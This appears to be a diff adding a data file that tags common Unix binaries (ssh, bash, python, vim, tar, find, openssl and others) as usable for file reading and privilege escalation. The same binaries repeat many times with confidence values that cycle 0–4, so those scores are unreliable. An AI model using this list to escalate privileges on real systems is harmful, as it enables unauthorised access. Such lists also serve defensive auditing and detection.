+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
